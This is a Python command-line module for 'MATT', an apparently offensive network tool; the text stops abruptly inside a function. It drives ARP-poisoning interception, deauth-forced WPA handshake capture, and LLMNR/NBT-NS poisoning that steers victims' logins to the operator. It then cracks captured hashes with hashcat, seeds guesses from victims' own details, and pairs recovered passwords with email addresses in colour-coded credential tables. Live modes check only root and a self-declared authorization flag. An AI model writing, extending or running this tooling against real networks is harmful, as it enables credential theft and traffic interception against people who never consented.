"""matt.cli -- argument handling and the live run loop.

Two modes, and the difference between them is the whole design:

  --analyze-only   read an existing capture_report.json, run stage 2 in this
                   process, write the analysis. Zero network calls, zero usage
                   tokens, no root, no interface. This is the default job on a
                   quiet laptop.

  live capture     poison ARP, sniff, decode, analyze. Refuses to start unless
                   it is root, --iface exists, and --i-have-written-authorization
                   was passed -- all three checked before anything is opened, so
                   a typo cannot send an unauthorized ARP storm across a network
                   someone else owns.

``--use-model`` is the only flag that can reach the network, and it is the only
thing in this program that does. Without it, no HTTP request is made at all.
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import socket
import subprocess
import sys
import time

from . import capture as _capture
from . import core as _core
from . import model as _model
from . import tlsdecrypt as _tlsdecrypt

try:
    from . import __version__ as _VERSION
except Exception:  # pragma: no cover
    _VERSION = "unknown"

__all__ = ["build_parser", "main", "run_offline", "run_live"]

EXIT_OK = 0
EXIT_CONFIG = 2
EXIT_LIVE = 3
EXIT_MODEL = 4


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="matt",
        description=(
            "MATT (Man At The Top): ARP-poison MITM capture (stage 1) and "
            "deterministic credential decode + prose (stage 2). Run `matt` with "
            "no arguments for an interactive menu. A default run makes zero "
            "network calls and costs zero usage tokens."
        ),
        epilog=(
            "examples:\n"
            "  matt                                            # interactive menu\n"
            "  matt --analyze-only capture_report.json --table # one row per cred\n"
            "  matt --analyze-only capture_report.json --crack # recover plaintext\n"
            "  matt --analyze-only capture_report.json --json | jq .   # pipe out\n"
            "  sudo matt --iface wlan0 --duration 60 "
            "--i-have-written-authorization\n"
            "  sudo matt --iface wlan0 --no-poison "
            "--i-have-written-authorization   # passive\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    offline = parser.add_argument_group(
        "offline (no root, no interface, zero network)")
    offline.add_argument(
        "--analyze-only", metavar="REPORT",
        help="run stage 2 against an existing capture_report.json and exit")
    offline.add_argument("--report", metavar="PATH", default=_capture.REPORT_NAME,
                         help="where the capture report is written "
                              "(default: ./capture_report.json)")
    offline.add_argument("--analysis", metavar="PATH",
                         help="where stage 2 output is written "
                              "(default: alongside the capture report)")
    offline.add_argument("--pretty", action="store_true",
                         help="print stage 2 prose to stdout as well as the file")
    offline.add_argument("--json", action="store_true", dest="as_json",
                         help="print the analysis as JSON to stdout (for piping "
                              "into jq/other tools); suppresses the banner and "
                              "the human summary")
    offline.add_argument("--table", action="store_true", dest="as_table",
                         help="print one compact row per credential "
                              "(host, target, user, type, secret/cracked)")
    offline.add_argument("--identify", metavar="HASH",
                         help="identify a hash's likely type(s) and hashcat mode "
                              "(and reverse it if it is a common password), then exit")

    live = parser.add_argument_group(
        "live capture (root + existing --iface + written authorization)")
    live.add_argument("--iface", metavar="NAME",
                      help="interface to poison and sniff, e.g. wlan0")
    live.add_argument("--duration", type=float, default=30.0,
                      help="seconds to poison and sniff (default: 30)")
    live.add_argument("--gateway", metavar="IP",
                      help="override the auto-detected default gateway")
    live.add_argument("--no-poison", action="store_true",
                      help="passive capture only: do not run ettercap")
    live.add_argument("--i-have-written-authorization", action="store_true",
                      dest="authorized",
                      help="required: confirm written authorization for this network")
    live.add_argument("--capture-tool", metavar="BIN",
                      help="capture binary (default: tcpdump, else tshark)")
    live.add_argument("--max-packets", type=int, default=0,
                      help="cap the capture at N packets (default: 0 = no cap, "
                           "bounded only by --duration so a busy link is not "
                           "truncated to its first frames)")
    live.add_argument("--keylog", metavar="PATH", default=None,
                      help="TLS key log written by a browser or app (SSLKEYLOGFILE) "
                           "to decrypt HTTPS in the capture; the raw pcap is kept "
                           "beside the report")
    live.add_argument("--dry-run", action="store_true",
                      help="show what would run without touching the network")
    live.add_argument("--watch", metavar="DIR",
                      help="active response: watch DIR for new capture_report.json "
                           "files and analyze each as it appears (combine with "
                           "--crack / --table / --json)")
    live.add_argument("--watch-interval", type=float, default=5.0,
                      help="seconds between --watch scans (default: 5)")
    live.add_argument("--euid", type=int, default=None, help=argparse.SUPPRESS)
    live.add_argument("--runner", default=None, help=argparse.SUPPRESS)

    model = parser.add_argument_group(
        "stage 2 model (opt-in; the ONLY thing here that opens a socket)")
    model.add_argument("--use-model", action="store_true",
                       help="call an LLM for stage 2 prose; without this, "
                            "stage2_prose runs locally and no HTTP request is made")
    model.add_argument("--model-url", metavar="URL",
                       help="endpoint base URL (env MATT_MODEL_URL / "
                            "ANTHROPIC_BASE_URL); no default is guessed")
    model.add_argument("--model", metavar="NAME",
                       help=f"model name (default: {_model.DEFAULT_MODEL})")
    model.add_argument("--api-key", metavar="KEY",
                       help="API key, literal (env MATT_MODEL_API_KEY / "
                            "ANTHROPIC_API_KEY)")
    model.add_argument("--api-key-env", metavar="NAME",
                       help="read the API key from this environment variable")
    model.add_argument("--allow-default-endpoint", action="store_true",
                       help=f"permit the built-in endpoint {_model.DEFAULT_BASE_URL}")
    model.add_argument("--max-tokens", type=int, default=_model.MAX_TOKENS,
                       help=f"completion cap per call (default: {_model.MAX_TOKENS})")

    crack = parser.add_argument_group(
        "crack (optional: run hashcat on the findings)")
    crack.add_argument("--crack", action="store_true",
                       help="after analysis, run hashcat on the credential-bearing "
                            "findings and show any recovered plaintext. Before the "
                            "real wordlist, MATT always tries a small wordlist it "
                            "generates on the fly from the target's own context "
                            "(decoded usernames/hosts/emails, and --ssid for a WPA "
                            "crack) -- a password built from the target itself "
                            "often cracks in this pass alone")
    crack.add_argument("--wordlist", metavar="PATH", default=None,
                       help="wordlist for --crack "
                            "(default: /usr/share/wordlists/rockyou.txt)")
    crack.add_argument("--crack-timeout", type=int, default=300,
                       help="seconds per hashcat run before giving up (default: 300)")
    crack.add_argument("--crack-slow", action="store_true",
                       help="disable hashcat's optimized kernels (-O). MATT uses "
                            "-O by default: much faster and far less memory (so it "
                            "runs on low-RAM machines), at the cost of capping "
                            "password length (~31 chars). Pass this to crack "
                            "longer passwords exhaustively.")

    wifi = parser.add_argument_group(
        "wi-fi handshake (monitor-mode adapter + aircrack-ng/hcxtools)")
    wifi.add_argument("--wpa", action="store_true",
                      help="capture a WPA/WPA2 handshake (deauth-triggered) and "
                           "convert it to hashcat 22000")
    wifi.add_argument("--bssid", help="target AP BSSID for --wpa")
    wifi.add_argument("--ssid", help="target AP SSID for --wpa (channel is then "
                      "auto-detected by scanning)")
    wifi.add_argument("--channel", help="target AP channel for --wpa "
                      "(auto-detected from --bssid/--ssid if omitted)")
    wifi.add_argument("--client", help="client MAC to deauth (default: broadcast)")
    wifi.add_argument("--deauth", type=int, default=5, dest="deauth_count",
                      help="deauth frames to send (0 = continuous; default 5)")
    wifi.add_argument("--wpa-out", default="matt-wpa.22000",
                      help="where the 22000 hash is written (default: matt-wpa.22000)")
    wifi.add_argument("--monitor-setup", action="store_true",
                      help="put --iface into monitor mode, ready for passive "
                           "capture in Wireshark; auto-picks the busiest "
                           "channel (most active devices) by scanning, unless "
                           "--channel names one")
    wifi.add_argument("--monitor-restore", action="store_true",
                      help="put --iface back into managed mode")
    wifi.add_argument("--scan-seconds", type=float, default=1.5,
                      help="dwell time per channel for --monitor-setup's "
                           "auto channel scan (default: 1.5)")
    wifi.add_argument("--llmnr", action="store_true",
                      help="LLMNR/NBT-NS poisoning: answer name queries with "
                           "--our-ip so auth is funnelled here (root + authorization)")
    wifi.add_argument("--our-ip",
                      help="address to answer LLMNR/NBT-NS with "
                           "(default: this host's IPv4 on --iface)")

    dash = parser.add_argument_group("dashboard")
    dash.add_argument("--dashboard", metavar="DIR", nargs="?", const=".",
                      help="live dashboard of findings from DIR in the TERMINAL "
                           "(default: current directory); auto-refreshes in place")
    dash.add_argument("--refresh", type=float, default=2.0,
                      help="seconds between dashboard refreshes (default: 2)")
    dash.add_argument("--web", action="store_true",
                      help="serve the dashboard as a local web page instead of in "
                           "the terminal (opt-in)")
    dash.add_argument("--dashboard-port", type=int, default=8899,
                      help="port for --dashboard --web (default: 8899)")

    ux = parser.add_argument_group("display & menu")
    ux.add_argument("-i", "--menu", action="store_true",
                    help="open the interactive menu (this is the default when "
                         "`matt` is run with no arguments in a terminal)")
    ux.add_argument("--no-banner", action="store_true",
                    help="do not print the ASCII MATT banner")
    ux.add_argument("--version", action="version", version="matt %s" % _VERSION,
                    help="show the MATT version and exit")
    return parser


def _model_writer(args):
    """Build the stage 2 writer the flags ask for. Loud on misconfiguration."""
    if not args.use_model:
        return None
    api_key = args.api_key
    if not api_key and args.api_key_env:
        api_key = os.environ.get(args.api_key_env)
        if not api_key:
            raise _model.ModelConfigError(
                f"--api-key-env {args.api_key_env} names an empty variable, so "
                "there is no key to read")
    env = dict(os.environ)
    if args.allow_default_endpoint:
        env["MATT_ALLOW_DEFAULT_ENDPOINT"] = "1"
    endpoint = _model.resolve_endpoint(base_url=args.model_url, api_key=api_key,
                                       model=args.model, env=env)
    return _model.model_writer(base_url=endpoint["base_url"],
                               api_key=endpoint["api_key"],
                               model=endpoint["model"], max_tokens=args.max_tokens)


def _is_interactive() -> bool:
    """True only when a human at a terminal is driving both ends."""
    try:
        return sys.stdin.isatty() and sys.stdout.isatty()
    except Exception:  # pragma: no cover - exotic stdio
        return False


def _show_banner(args) -> None:
    """Print the ASCII banner above a run, but only for a real terminal and only
    when it was not suppressed. Tests and pipes (not a tty) never see it, so no
    output assertion has to account for it."""
    if getattr(args, "no_banner", False) or getattr(args, "as_json", False):
        return
    try:
        if sys.stdout.isatty():
            from . import ui
            print(ui.render_header(sys.stdout))
            print()
    except Exception:  # pragma: no cover - the banner is never load-bearing
        pass


def _c(text, *styles):
    """Colour CLI output via ui.paint, gated on stdout being a real terminal."""
    try:
        from . import ui
        return ui.paint(text, *styles, stream=sys.stdout)
    except Exception:  # pragma: no cover - colour is never load-bearing
        return text


def _derive_wpa_cap(report_path) -> "str | None":
    """If the --analyze-only input is a plain *.22000 hash file (e.g. the
    matt-wpa.22000 --wpa just produced), the raw handshake sits next to it as
    <prefix>-01.cap (wifi.orchestrate's naming convention). Return that path
    if it exists, so a hashcat OOM can fall back to aircrack-ng, which needs
    far less memory for the same WPA attack."""
    if not report_path or not report_path.endswith(".22000"):
        return None
    cap = report_path[: -len(".22000")] + "-01.cap"
    return cap if os.path.exists(cap) else None


def _run_crack(findings, args) -> None:
    """The 'crack this now' step: hand the credential-bearing findings to
    hashcat and show any recovered plaintext. Red-themed, since this is the step
    that actually turns a captured hash into a password. Falls back to
    aircrack-ng for a WPA (mode 22000) finding if hashcat runs out of memory
    and the raw .cap is findable next to the --analyze-only input."""
    from . import crack as _crack
    wl = args.wordlist or _crack.DEFAULT_WORDLIST
    print()
    print(_c("  === crack this now (hashcat) ===", "red", "bold"))
    if not _crack.have_hashcat():
        print(_c("  hashcat is not installed / not on PATH -- skipping.", "red"))
        return
    targets = _crack.crackable(findings)
    if not targets:
        print(_c("  no crackable candidates (nothing with a hashcat mode).", "dim"))
        return
    if not os.path.exists(wl):
        print(_c("  wordlist not found: %s" % wl, "red"))
        print(_c("  pass --wordlist PATH (rockyou is usually at "
                 "/usr/share/wordlists/rockyou.txt.gz -- gunzip it first).", "dim"))
        return
    print(_c("  running hashcat on %d candidate(s) against %s ..."
             % (len(targets), wl), "red"))
    wpa_cap = _derive_wpa_cap(getattr(args, "analyze_only", None))
    if wpa_cap and not _crack.have_aircrack():
        wpa_cap = None  # nothing to fall back to -- don't claim we will
    context_seeds = _crack.seeds_from_findings(
        findings, extra=[getattr(args, "ssid", None)])
    results = _crack.crack(findings, wordlist=wl, timeout=args.crack_timeout,
                           optimized=not args.crack_slow, wpa_cap=wpa_cap,
                           context_seeds=context_seeds)
    cracked = 0
    for r in results:
        who = r.get("username") or "(no user)"
        dest = r.get("target") or r.get("host") or "(unknown)"
        tag = "%s -m %s" % (r["kind"], r["mode"])
        if r["plaintext"] is not None:
            cracked += 1
            print(_c("  [CRACKED] %s @ %s  (%s)  =  %s"
                     % (who, dest, tag, r["plaintext"]), "red", "bold"))
        else:
            why = r.get("note") or "not in wordlist"
            print(_c("  [  --  ] %s @ %s  (%s)  -- %s" % (who, dest, tag, why), "dim"))
    summary = "  cracked %d/%d." % (cracked, len(results))
    print(_c(summary, "red", "bold") if cracked else _c(summary, "dim"))
    # fold recovered plaintext back onto the findings so a following --table can
    # show it in the SECRET column.
    plain = {r["candidate"]: r["plaintext"] for r in results if r["plaintext"]}
    for f in findings:
        if f.get("candidate") in plain:
            f["plaintext"] = plain[f["candidate"]]
    _link_emails_to_plaintext(findings)


def _link_emails_to_plaintext(findings) -> None:
    """A bare email address seen in the same payload as a hash that just got
    cracked (same ``target``/``host``) is a real recovered credential pair,
    not just a passive sighting -- upgrade it in place once cracking is done."""
    cracked_by_dest = {}
    for f in findings:
        dest = f.get("target") or f.get("host")
        if f.get("plaintext") and dest:
            cracked_by_dest.setdefault(dest, f["plaintext"])
    for f in findings:
        if f.get("kind") != "email" or f.get("credential_bearing"):
            continue
        pw = cracked_by_dest.get(f.get("target") or f.get("host"))
        if pw:
            f["credential_bearing"] = True
            f["plaintext"] = pw
            f["candidate"] = "%s:%s" % (f.get("username") or f["candidate"], pw)


def run_wpa(args) -> int:
    """WPA/WPA2 handshake capture: monitor mode, channel-locked capture, a short
    deauth to force a reconnect, then convert to hashcat 22000. Shows the plan on
    --dry-run or when the aircrack-ng/hcxtools suite is missing."""
    from . import wifi
    if not args.iface:
        sys.stderr.write("matt: --wpa needs --iface (a monitor-capable adapter)\n")
        return EXIT_CONFIG
    ssid = getattr(args, "ssid", None)
    if not args.bssid and not ssid:
        sys.stderr.write("matt: --wpa needs --bssid or --ssid "
                         "(the channel is then auto-detected)\n")
        return EXIT_CONFIG
    gone = wifi.missing_tools()
    # Auto-detect the channel by scanning when the operator did not give one.
    # Scanning and monitor setup need root, so on a real (non-dry) run this
    # happens after the gates below; here we only need a value for the plan.
    if not args.dry_run and not gone and not args.channel:
        try:
            _capture.require_root(args.euid)
            _capture.require_authorization(args.authorized)
        except PermissionError as exc:
            sys.stderr.write("matt: refusing to run: %s\n" % exc)
            return EXIT_CONFIG
        print(_c("  scanning on %s to find the target AP's channel ..."
                 % args.iface, "cyan"))
        args.channel = wifi.find_channel(args.iface, bssid=args.bssid, ssid=ssid)
        if not args.channel:
            print(_c("  could not find %s in a scan -- is it in range / powered?"
                     % (args.bssid or ssid), "red"))
            return EXIT_LIVE
        if not args.bssid:   # resolve the BSSID too, so airodump can lock to it
            for ap in wifi.list_aps(args.iface):
                if ap.get("ssid") == ssid:
                    args.bssid = ap["bssid"]
                    break
        print(_c("  auto-detected: AP %s on channel %s"
                 % (args.bssid, args.channel), "green"))
    pln = wifi.plan(args.iface, args.bssid, args.channel or "<auto>",
                    client=args.client, count=args.deauth_count, out=args.wpa_out)
    if args.dry_run or gone:
        if gone:
            print(_c("  missing tools: %s  (install: aircrack-ng + hcxtools)"
                     % ", ".join(gone), "red"))
            print(_c("  here is the plan it would run:", "dim"))
        else:
            print(_c("  dry run -- WPA handshake capture plan:", "bold"))
        for label, cmd in pln:
            print("    %-14s %s" % (label, " ".join(cmd)))
        return EXIT_OK
    try:
        _capture.require_root(args.euid)
        _capture.require_authorization(args.authorized)
    except PermissionError as exc:
        sys.stderr.write("matt: refusing to run: %s\n" % exc)
        return EXIT_CONFIG
    print(_c("  capturing WPA handshake on %s (AP %s, ch %s), deauth x%d ..."
             % (args.iface, args.bssid, args.channel, args.deauth_count),
             "red", "bold"))
    res = wifi.orchestrate(args.iface, args.bssid, args.channel, client=args.client,
                           count=args.deauth_count, out=args.wpa_out)
    for step in res["steps"]:
        print(_c("    - %s" % step, "dim"))
    if res.get("error"):
        print(_c("  " + res["error"], "red"))
        return EXIT_LIVE
    if res["ok"]:
        print(_c("  [HANDSHAKE] written to %s (hashcat -m 22000)" % res["out"],
                 "green", "bold"))
    else:
        print(_c("  no handshake captured -- try again or raise --deauth.", "dim"))
    return EXIT_OK


def run_monitor_restore(args) -> int:
    """Put --iface back into managed mode (undoes --monitor-setup)."""
    from . import wifi
    if not args.iface:
        sys.stderr.write("matt: --monitor-restore needs --iface\n")
        return EXIT_CONFIG
    if args.dry_run:
        print(_c("  dry run -- would restore managed mode on %s." % args.iface, "dim"))
        return EXIT_OK
    try:
        _capture.require_root(args.euid)
    except PermissionError as exc:
        sys.stderr.write("matt: refusing to run: %s\n" % exc)
        return EXIT_CONFIG
    for cmd in wifi.monitor_down(args.iface):
        subprocess.run(cmd, check=False)
    print(_c("  %s is back in managed mode." % args.iface, "green"))
    return EXIT_OK


def run_monitor_setup(args) -> int:
    """Put --iface into monitor mode, ready for passive capture in Wireshark.
    With no --channel, scans the common channels and auto-picks the busiest
    one (most distinct devices seen transmitting) -- this is the "auto select
    the best channel" path: no guessing, no manually running iw by hand."""
    from . import wifi
    if not args.iface:
        sys.stderr.write("matt: --monitor-setup needs --iface (the "
                         "monitor-capable adapter)\n")
        return EXIT_CONFIG
    missing = [t for t in ("iw", "ip") if not wifi._which_incl_sbin(t)]
    if missing:
        sys.stderr.write("matt: missing tools: %s\n" % ", ".join(missing))
        return EXIT_CONFIG

    channel = args.channel
    if args.dry_run:
        if channel:
            print(_c("  dry run -- would set %s to monitor mode on channel %s."
                     % (args.iface, channel), "dim"))
        else:
            print(_c("  dry run -- would scan the common channels on %s and "
                     "lock to the busiest one." % args.iface, "dim"))
        return EXIT_OK
    try:
        _capture.require_root(args.euid)
    except PermissionError as exc:
        sys.stderr.write("matt: refusing to run: %s\n" % exc)
        return EXIT_CONFIG

    if not channel:
        total = len(wifi.DEFAULT_SCAN_CHANNELS)

        def on_progress(i, n, ch):
            bar = _c(_ui_progress_bar(i / n), "cyan")
            line = "  scanning for the busiest channel  %s  ch %-4s (%d/%d)" % (
                bar, ch, i, n)
            if sys.stdout.isatty():
                sys.stdout.write("\r" + line)
                sys.stdout.flush()
            else:
                print(line)

        ranked = wifi.best_channel_by_activity(args.iface, dwell=args.scan_seconds,
                                               on_progress=on_progress)
        if sys.stdout.isatty():
            sys.stdout.write("\n")
        if not ranked or not any(r["devices"] for r in ranked):
            print(_c("  no activity detected on any scanned channel -- is the "
                     "adapter in range of any Wi-Fi traffic?", "red"))
            return EXIT_LIVE
        print(_c("  channel activity (busiest first):", "bold"))
        for r in ranked[:8]:
            print("    ch %-4s  devices %-4d  frames %-5d"
                  % (r["channel"], r["devices"], r["frames"]))
        channel = ranked[0]["channel"]
        print(_c("  auto-selected channel %s (%d active device(s))"
                 % (channel, ranked[0]["devices"]), "green", "bold"))
        for cmd in wifi.monitor_up(args.iface):
            subprocess.run(cmd, check=False)
        subprocess.run(wifi.set_channel(args.iface, channel), check=False)
    else:
        for cmd in wifi.monitor_up(args.iface):
            subprocess.run(cmd, check=False)
        subprocess.run(wifi.set_channel(args.iface, channel), check=False)

    print(_c("  %s is now in MONITOR mode on channel %s -- ready for Wireshark."
             % (args.iface, channel), "green", "bold"))
    print(_c("  restore managed mode later with: matt --monitor-restore --iface %s"
             % args.iface, "dim"))
    return EXIT_OK


def _ui_progress_bar(fraction):
    from . import ui
    return ui.progress_bar(fraction)


def _print_dashboard_rows(rows) -> None:
    headers = ("HOST", "TARGET", "USER", "TYPE", "SECRET / CRACKED")
    data = [(r["host"], r["target"] or "-", r["user"] or "-", r["type"],
             r["secret"] or (("-m " + r["mode"]) if r["mode"] else "-"))
            for r in rows]
    caps = (24, 30, 18, 11, 28)
    widths = [min(cap, max(len(headers[i]), *(len(str(d[i])) for d in data)) if data
                  else len(headers[i])) for i, cap in enumerate(caps)]
    print("  " + "  ".join(_c(_clip(h, w).ljust(w), "bold")
                           for h, w in zip(headers, widths)))
    print(_c("  " + "  ".join("-" * w for w in widths), "dim"))
    if not data:
        print(_c("  (waiting for captures ...)", "dim"))
    for r, d in zip(rows, data):
        sec_style = ("green", "bold") if r["secret"] else (
            ("yellow",) if r["mode"] else ("dim",))
        print("  " + "  ".join([
            _cell(d[0], widths[0]), _cell(d[1], widths[1]), _cell(d[2], widths[2]),
            _cell(d[3], widths[3], (_kind_style(d[3]),)),
            _cell(d[4], widths[4], sec_style),
        ]))


def _iface_ipv4(iface):
    """This host's IPv4 on ``iface``, or None."""
    if not iface:
        return None
    try:
        import fcntl
        import struct as _struct
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            return socket.inet_ntoa(fcntl.ioctl(
                s.fileno(), 0x8915, _struct.pack("256s", iface[:15].encode()))[20:24])
    except Exception:
        return None


def run_llmnr(args) -> int:
    """LLMNR/NBT-NS poisoning. Answers name queries with our address so a victim's
    next auth comes here, where MATT's NetNTLMv2 decoder catches it. Gated like
    the ARP poison: root + written authorization, local segment only."""
    from . import llmnr
    our_ip = args.our_ip or _iface_ipv4(args.iface)
    if not our_ip:
        sys.stderr.write("matt: --llmnr needs --our-ip (or --iface with an "
                         "address) to answer queries with\n")
        return EXIT_CONFIG
    if args.dry_run:
        print(_c("  dry run -- LLMNR/NBT-NS poisoning plan:", "bold"))
        print("    bind UDP 5355 (LLMNR multicast 224.0.0.252) and UDP 137 (NBT-NS)")
        print("    answer every name query with  %s" % our_ip)
        print("    for %.0fs; poisoned victims then auth here (capture separately)"
              % args.duration)
        return EXIT_OK
    try:
        _capture.require_root(args.euid)
        _capture.require_authorization(args.authorized)
    except PermissionError as exc:
        sys.stderr.write("matt: refusing to run: %s\n" % exc)
        return EXIT_CONFIG
    print(_c("  LLMNR/NBT-NS poisoning as %s for %.0fs (Ctrl-C to stop) ..."
             % (our_ip, args.duration), "red", "bold"))

    def on_event(e):
        print(_c("    [poisoned] %-6s %-25s <- %s"
                 % (e["proto"], e["name"], e["victim"]), "red"))

    try:
        log = llmnr.poison(our_ip, duration=args.duration, on_event=on_event)
    except KeyboardInterrupt:
        log = []
    victims = sorted({e["victim"] for e in log})
    print(_c("  poisoned %d quer%s from %d host(s)."
             % (len(log), "y" if len(log) == 1 else "ies", len(victims)),
             "red", "bold"))
    print(_c("  next: capture their auth with  sudo matt --iface %s --no-poison "
             "--i-have-written-authorization" % (args.iface or "wlan0"), "dim"))
    return EXIT_OK


def run_dashboard(args) -> int:
    """Live dashboard of findings. Terminal by default (redraws in place); only
    serves a web page when --web is passed, so nothing opens a browser."""
    from . import dashboard
    root = args.dashboard
    if not os.path.isdir(root):
        sys.stderr.write("matt: --dashboard: not a directory: %s\n" % root)
        return EXIT_CONFIG

    if args.web:
        httpd = dashboard.serve(root, args.dashboard_port)
        print(_c("  MATT dashboard (web) at http://127.0.0.1:%d/  (Ctrl-C to stop)"
                 % args.dashboard_port, "cyan", "bold"))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(_c("\n  dashboard stopped.", "dim"))
        finally:
            httpd.server_close()
        return EXIT_OK

    out = sys.stdout
    tty = out.isatty()
    try:
        while True:
            data = dashboard.collect_findings(root)
            if tty:
                out.write("\033[H\033[2J")       # home + clear
            print(render_header_safe(out) if tty else "MATT -- live findings")
            print(_c("  live findings   ", "bold")
                  + _c("count %d" % data["count"], "cyan", "bold")
                  + _c("   %s   refresh %.0fs   Ctrl-C to stop"
                       % (data["generated"], args.refresh), "dim"))
            print()
            _print_dashboard_rows(data["rows"])
            out.flush()
            time.sleep(max(0.5, args.refresh))
    except KeyboardInterrupt:
        print(_c("\n  dashboard stopped.", "dim"))
    return EXIT_OK


def render_header_safe(out):
    try:
        from . import ui
        return ui.render_header(out)
    except Exception:  # pragma: no cover
        return "MATT -- live findings"


def run_watch(args) -> int:
    """Active response: poll a directory for new capture_report.json files and
    analyze each as it appears. Combine with --crack/--table/--json. Loops until
    Ctrl-C, so it is meant for a terminal or a service, never a one-shot run."""
    import glob
    root = args.watch
    if not os.path.isdir(root):
        sys.stderr.write("matt: --watch: not a directory: %s\n" % root)
        return EXIT_CONFIG
    print(_c("watching %s for new capture reports (Ctrl-C to stop) ..." % root,
             "cyan", "bold"))
    seen = {}
    try:
        while True:
            for path in sorted(glob.glob(
                    os.path.join(root, "**", "capture_report.json"), recursive=True)):
                try:
                    mtime = os.path.getmtime(path)
                except OSError:
                    continue
                if seen.get(path) == mtime:
                    continue
                seen[path] = mtime
                print(_c("\n=== %s ===" % path, "bold"))
                sub = argparse.Namespace(**vars(args))
                sub.analyze_only = path
                sub.watch = None
                sub.no_banner = True
                run_offline(sub, None)
            time.sleep(max(0.5, args.watch_interval))
    except KeyboardInterrupt:
        print(_c("\nstopped watching.", "dim"))
        return EXIT_OK


def _do_identify(value) -> int:
    """`--identify HASH`: name the likely hash type(s) + hashcat mode, and try an
    instant reversal against the built-in common-password table."""
    cands = _core.identify_hash(value)
    if not cands:
        print(_c("  unrecognized hash shape.", "dim"))
    else:
        print(_c("  likely types for this hash:", "bold"))
        for name, mode in cands:
            if mode:
                m = _c("crack with hashcat -m %s" % mode, "yellow")
            else:
                m = _c("(no direct hashcat mode)", "dim")
            print("    " + _c("%-40s" % name, "cyan") + m)
    rev = _core.reverse_hash(value)
    if rev is not None:
        print(_c("  [REVERSED] common password, no cracking needed: %s" % rev,
                 "green", "bold"))
    else:
        print(_c("  not a common-password hash -- use --crack with a wordlist.", "dim"))
    return EXIT_OK


def _auto_reverse(findings) -> None:
    """Instantly reverse weak/common UNSALTED hashes (MD5/SHA-1/SHA-256/NTLM) via
    the built-in table, so the table and prose show them recovered for free --
    no hashcat, no network, no brute force."""
    for f in findings:
        if f.get("plaintext"):
            continue
        if str(f.get("hashcat_mode") or "") in ("0", "100", "1400", "1000", "900"):
            pt = _core.reverse_hash(f.get("candidate", ""))
            if pt is not None:
                f["plaintext"] = pt


def _annotate_crack(findings, args) -> None:
    """Run hashcat and attach any recovered plaintext onto the findings in place,
    so --json emits the cracked passwords alongside everything else."""
    from . import crack as _crack
    wl = args.wordlist or _crack.DEFAULT_WORDLIST
    if not _crack.have_hashcat() or not os.path.exists(wl):
        return
    wpa_cap = _derive_wpa_cap(getattr(args, "analyze_only", None))
    if wpa_cap and not _crack.have_aircrack():
        wpa_cap = None
    context_seeds = _crack.seeds_from_findings(
        findings, extra=[getattr(args, "ssid", None)])
    results = _crack.crack(findings, wordlist=wl, timeout=args.crack_timeout,
                           optimized=not args.crack_slow, wpa_cap=wpa_cap,
                           context_seeds=context_seeds)
    plain = {r["candidate"]: r["plaintext"] for r in results if r["plaintext"]}
    for f in findings:
        if f.get("candidate") in plain:
            f["plaintext"] = plain[f["candidate"]]
    _link_emails_to_plaintext(findings)


def _clip(text, width):
    text = str(text)
    return text if len(text) <= width else text[:width - 1] + "…"


def _finding_secret(f):
    """The password for a finding: the cracked plaintext if we have it, the
    cleartext password for a login that was already in the clear, else '-'."""
    if f.get("plaintext"):
        return f["plaintext"]
    if not f.get("hashcat_mode") and f.get("credential_bearing"):
        cand, user = f.get("candidate", ""), f.get("username", "")
        if user and cand.startswith(user + ":"):
            return cand[len(user) + 1:]
        return cand
    return "-"


# Colour code: green = a secret in hand (cleartext login or cracked), yellow =
# a crackable hash, cyan = recon (TLS/SNMPv3/QUIC), dim = nothing yet.
_CLEARTEXT_KINDS = {"ftp", "pop3", "imap", "smtp", "ldap", "telnet",
                    "http-basic", "snmp"}
_RECON_KINDS = {"tls-sni", "tls-cert", "quic", "snmpv3", "email"}


def _kind_style(kind):
    if kind in _CLEARTEXT_KINDS:
        return "green"
    if kind in _RECON_KINDS:
        return "cyan"
    return "yellow"            # a crackable hash


def _secret_style(f):
    if f.get("plaintext") or (not f.get("hashcat_mode") and f.get("credential_bearing")):
        return ("green", "bold")   # recovered
    if f.get("hashcat_mode"):
        return ("yellow",)         # crackable, not yet cracked
    return ("dim",)                # recon, no secret


def _cell(text, width, style=None):
    s = _clip(text, width).ljust(width)
    return _c(s, *style) if style else s


def _host_label(f) -> str:
    """How a finding's source host is shown: the device name next to its IP when
    MATT identified the device (e.g. "Nintendo (10.0.0.9)"), else the host/IP, or
    "the wire" when there is no host at all."""
    host = f.get("host") or "the wire"
    device = f.get("device")
    if device and device not in host:
        return "%s (%s)" % (device, host)
    return host


def _print_table(findings) -> None:
    """One row per credential: device/host, target, user, type, secret/cracked,
    colour coded by category. Only actual credentials/recon are listed."""
    creds = [f for f in findings
             if f.get("credential_bearing") or f.get("hashcat_mode")
             or f.get("kind") in _RECON_KINDS]
    headers = ("DEVICE / HOST", "TARGET", "USER", "TYPE", "SECRET / CRACKED")
    rows = [(_host_label(f), f.get("target") or "-",
             f.get("username") or "-", f.get("kind") or "-", _finding_secret(f))
            for f in creds]
    caps = (28, 28, 18, 11, 26)
    widths = [min(cap, max(len(headers[i]), *(len(str(r[i])) for r in rows)) if rows
                  else len(headers[i])) for i, cap in enumerate(caps)]
    print("  " + "  ".join(_c(_clip(h, w).ljust(w), "bold")
                           for h, w in zip(headers, widths)))
    print(_c("  " + "  ".join("-" * w for w in widths), "dim"))
    if not rows:
        print(_c("  (no credentials)", "dim"))
    for f, r in zip(creds, rows):
        print("  " + "  ".join([
            _cell(r[0], widths[0]),
            _cell(r[1], widths[1]),
            _cell(r[2], widths[2]),
            _cell(r[3], widths[3], (_kind_style(r[3]),)),
            _cell(r[4], widths[4], _secret_style(f)),
        ]))


def _print_findings(findings) -> None:
    """One block per credential: a coloured 'source -> destination' header so
    that, in a report with several, each one's target is unmistakable."""
    for f in findings:
        host = _host_label(f)
        target = f.get("target")
        kind = f.get("kind") or ""
        label = f"{host}  ->  {target}" if target else host
        tag = _c("[%s]" % kind, _kind_style(kind), "bold") if kind else ""
        if f.get("plaintext") or (not f.get("hashcat_mode")
                                  and f.get("credential_bearing")):
            marker = _c("  [+] ", "green", "bold")      # secret in hand
            label = _c(label, "green", "bold")
        elif f.get("hashcat_mode"):
            marker = _c("  [#] ", "yellow", "bold")     # crackable hash
            label = _c(label, "yellow", "bold")
        elif kind in _RECON_KINDS:
